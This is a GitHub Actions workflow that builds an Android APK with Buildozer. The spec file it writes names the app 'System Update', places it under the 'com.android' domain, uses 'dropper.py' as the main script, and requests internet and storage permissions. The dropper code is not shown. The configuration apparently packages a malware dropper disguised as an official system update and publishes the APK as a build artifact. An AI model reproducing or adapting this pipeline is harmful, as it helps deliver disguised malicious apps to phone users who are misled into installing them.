name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04
    permissions:
      contents: read
      actions: write

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python 3.10
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y \
            build-essential git \
            zlib1g-dev libffi-dev libssl-dev \
            libtool libtool-bin m4 \
            autoconf automake pkg-config \
            libltdl-dev libltdl7
          /usr/bin/libtool --version

      - name: Install Python packages
        run: |
          pip install --upgrade pip
          pip install buildozer cython requests urllib3

      - name: Create buildozer.spec
        run: |
          cat > buildozer.spec << 'EOF'
          [app]
          title = System Update
          package.name = systemupdate
          package.domain = com.android
          source.main = dropper.py
          source.include_exts = py,png,jpg,kv,atlas
          android.api = 33
          android.minapi = 21
          android.archs = arm64-v8a,armeabi-v7a
          android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE
          android.accept_sdk_license = True
          requirements = python3,requests,urllib3

          [buildozer]
          log_level = 2
          warn_on_root = 1
          EOF

      - name: Build APK
        run: |
          yes | buildozer android debug 2>&1 | tee build_output.log

      - name: Upload APK
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: systemupdate-apk
          path: bin/*.apk
          retention-days: 30
          if-no-files-found: ignore

      - name: Upload build logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-logs
          path: build_output.log
          retention-days: 7
          if-no-files-found: ignore
